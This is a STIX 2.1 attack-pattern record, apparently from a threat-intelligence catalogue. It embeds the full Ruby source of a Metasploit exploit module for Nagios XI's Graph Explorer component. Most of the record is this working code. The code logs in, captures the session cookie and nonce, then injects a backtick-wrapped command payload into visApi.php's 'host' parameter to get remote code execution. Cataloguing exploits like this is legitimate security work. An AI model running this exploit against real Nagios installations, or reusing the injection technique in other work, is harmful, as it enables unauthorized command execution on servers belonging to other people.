{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--87113d9e-f776-46a4-9e08-92c7a42542eb",
    "created": "2024-08-14T17:12:55.751888Z",
    "modified": "2024-08-14T17:12:55.751892Z",
    "name": "\"Nagios XI Network Monitor Graph Explorer Component Command Injection\"",
    "description": " This module exploits a vulnerability found in Nagios XI Network Monitor's component 'Graph Explorer'.  An authenticated user can execute system commands by injecting it in several parameters, such as in visApi.php's 'host' parameter which results in remote code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/nagios_graph_explorer.rb",
            "external_id": "nagios_graph_explorer.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Nagios XI Network Monitor Graph Explorer Component Command Injection\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Nagios XI Network Monitor's\n        component 'Graph Explorer'.  An authenticated user can execute system commands\n        by injecting it in several parameters, such as in visApi.php's 'host' parameter,\n        which results in remote code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Daniel Compton <daniel.compton[at]ngssecure.com>', #Original discovery\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '83552' ],\n          [ 'BID', '54263' ],\n          [ 'PACKETSTORM', '118497' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0d\\x0a\",\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl python ruby telnet',\n            }\n        },\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['Graph Explorer Component prior to 1.3', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-11-30',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        # URI isn't registered, because this is set by the installer.\n        OptString.new('USERNAME', [true, 'The username to login as', 'nagiosadmin']),\n        OptString.new('PASSWORD', [true, 'The password to use'])\n      ])\n  end\n\n\n  def check\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => '/nagiosxi/includes/components/graphexplorer/visApi.php'\n    })\n\n    if res and res.code == 404\n      vprint_error(\"Remote host does not have Graph Explorer installed.\")\n    elsif res and res.body =~ /Your session has timed out/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def get_login_data\n    res = send_request_cgi({'uri'=>'/nagiosxi/login.php'})\n    return '' if !res\n\n    nsp = res.body.scan(/<input type='hidden' name='nsp' value='(.+)'>/).flatten[0] || ''\n    cookie = res.get_cookies.scan(/nagiosxi=(\\w+); /).flatten[0]  || ''\n    return nsp, cookie\n  end\n\n  def is_loggedin(cookie)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => '/nagiosxi/index.php',\n      'cookie' => \"nagiosxi=#{cookie}\"\n    })\n\n    if res and res.body =~ /Logged in as: <a href=\".+\">#{datastore['USERNAME']}<\\/a>/\n      return true\n    else\n      return false\n    end\n  end\n\n  def login(nsp, cookie)\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => '/nagiosxi/login.php',\n      'cookie'    => \"nagiosxi=#{cookie}\",\n      'vars_post' => {\n        'nsp'         => nsp,\n        'page'        => 'auth',\n        'debug'       => '',\n        'pageopt'     => 'login',\n        'username'    => datastore['USERNAME'],\n        'password'    => datastore['PASSWORD'],\n        'loginButton' => 'Login'\n      },\n      'headers'   => {\n        'Origin'  => \"http://#{rhost}\",\n        'Referer' => \"http://#{rhost}/nagiosxi/login.php\"\n      }\n    })\n\n    return is_loggedin(cookie)\n  end\n\n  def exploit\n    nsp, cookie = get_login_data\n    if nsp.empty?\n      print_error(\"Unable to retrieve hidden value 'nsp'\")\n      return false\n    end\n\n    if login(nsp, cookie)\n      print_status(\"Logged in as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'\")\n    else\n      print_error(\"Failed to login as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'\")\n      return\n    end\n\n    print_status(\"Sending Command injection\")\n    send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => '/nagiosxi/includes/components/graphexplorer/visApi.php',\n      'cookie'   => \"nagiosxi=#{cookie}\",\n      'vars_get' => {\n        'type' => 'stack',\n        'host' => \"localhost`#{payload.encoded}`\",\n        'service' => 'Swap_Usage',\n        'div'     => 'visContainer1566841654',\n        'opt'     => 'days'\n      }\n    })\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "2012-11-30",
    "x_mitre_platforms": [
        "['unix']"
    ]
}